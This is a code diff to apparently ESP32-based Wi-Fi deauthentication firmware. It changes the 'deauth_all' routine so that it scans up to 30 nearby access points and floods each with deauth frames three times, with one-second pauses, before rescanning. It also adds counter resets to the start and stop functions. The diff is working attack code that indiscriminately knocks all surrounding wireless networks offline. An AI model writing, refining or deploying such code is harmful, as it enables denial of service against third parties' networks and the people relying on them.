@@ -10,9 +10,10 @@ struct AP_Info {
     int32_t channel;   // Channel the AP operates on
 };
 
-#define MAX_APS 20  // Maximum number of access points to store
+#define MAX_APS 30  // Maximum number of access points to store
 AP_Info ap_list[MAX_APS];  // Array to store access point information
 int ap_count = 0;  // Counter for how many access points were found
+int deauth_iterations = 0;  // Counter for deauth iterations before rescan
 
 deauth_frame_t deauth_frame;
 int deauth_type = DEAUTH_TYPE_SINGLE;
@@ -26,7 +27,7 @@ esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, b
 
 // Function to perform a Wi-Fi scan and store AP information
 void performWiFiScan() {
-    int n = WiFi.scanNetworks(false, true);  // Perform a Wi-Fi scan
+    int n = WiFi.scanNetworks(false, true, true, 120UL);  //optimized configs
     if (n == 0) {
         DEBUG_PRINTLN("❓ No networks found during scan");
         ap_count = 0;
@@ -41,6 +42,7 @@ void performWiFiScan() {
                      ap_list[i].bssid[3], ap_list[i].bssid[4], ap_list[i].bssid[5], ap_list[i].channel);
     }
     WiFi.scanDelete();  // Free up memory used by the scan
+    deauth_iterations = 0;  // Reset iteration counter after scan
 }
 
 // Function to send deauth frames to a specific AP
@@ -60,9 +62,26 @@ void sendDeauthFrame(uint8_t bssid[6], int channel) {
 
 // Function to perform deauth attack on all scanned APs
 void deauth_all() {
-    performWiFiScan();  // Scan for APs
-    for (int i = 0; i < ap_count; i++) {
-        sendDeauthFrame(ap_list[i].bssid, ap_list[i].channel);
+    if (deauth_iterations == 0) {
+        performWiFiScan();  // Scan for APs only when iterations reset
+    }
+    if (ap_count > 0) {
+        for (int i = 0; i < ap_count; i++) {
+            sendDeauthFrame(ap_list[i].bssid, ap_list[i].channel);
+        }
+        deauth_iterations++;
+        if (deauth_iterations < 3) {
+            delay(1000);  // 1-second delay between deauth iterations
+            //DEBUG_PRINTLN("Waiting 1 second before next deauth iteration");
+            DEBUG_PRINTLN("########################################");
+        } else {
+            deauth_iterations = 0;  // Reset to trigger rescan next time
+            DEBUG_PRINTLN("🆗 Completed 3 deauth iterations, will rescan next call");
+        }
+    } else {
+        delay(1000);  // Wait 1 second if no APs found to avoid rapid looping
+        deauth_iterations = 0;  // Reset to trigger rescan
+        DEBUG_PRINTLN("❓ No APs found, waiting 1 second before rescan");
     }
 }
 
@@ -92,9 +111,10 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
   eliminated_stations = 0;
   deauth_type = attack_type;
   deauth_frame.reason = reason;
+  deauth_iterations = 0;  // Reset iterations for new attack
 
   if (deauth_type == DEAUTH_TYPE_SINGLE) {
-    DEBUG_PRINT("⚠︎ Starting Deauth-Attack on network: ");
+    DEBUG_PRINT("⚠ Starting Deauth-Attack on network: ");
     DEBUG_PRINTLN(WiFi.SSID(wifi_number));
     WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
     memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
@@ -116,4 +136,5 @@ void stop_deauth() {
   DEBUG_PRINTLN("🛑 Stopping Deauth-Attack..");
   esp_wifi_set_promiscuous(false);
   ap_count = 0;  // Reset AP count
+  deauth_iterations = 0;  // Reset iterations
 }
